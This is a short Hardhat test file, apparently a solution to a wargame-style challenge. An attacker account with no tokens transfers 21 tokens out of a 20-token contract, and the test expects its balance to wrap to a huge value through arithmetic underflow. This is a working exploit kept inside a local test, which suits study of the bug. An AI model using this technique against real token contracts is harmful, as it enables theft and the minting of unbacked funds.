import { TransactionResponse } from "@ethersproject/providers"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { expect } from "chai"
import { Contract, Wallet } from "ethers"
// @ts-ignore
import { ethers } from "hardhat"

const CONTRACT_NAME = "Token"

describe(CONTRACT_NAME, () => {
    let owner: SignerWithAddress
    let attacker: SignerWithAddress
    let contract: Contract
    let tx: TransactionResponse

    beforeEach(async () => {
        [ owner, attacker ] = await ethers.getSigners()

        const factory = await ethers.getContractFactory(CONTRACT_NAME)
        contract = await factory.deploy(20)
        await contract.deployed()
    })

    it("Should be possible to transfer very large amount of tokens", async () => {
        tx = await contract.connect(attacker).transfer(Wallet.createRandom().address, 21)
        await tx.wait()

        expect(await contract.balanceOf(attacker.address)).be.gt(20)
        // console.log(await contract.balanceOf(attacker.address))
    })
})


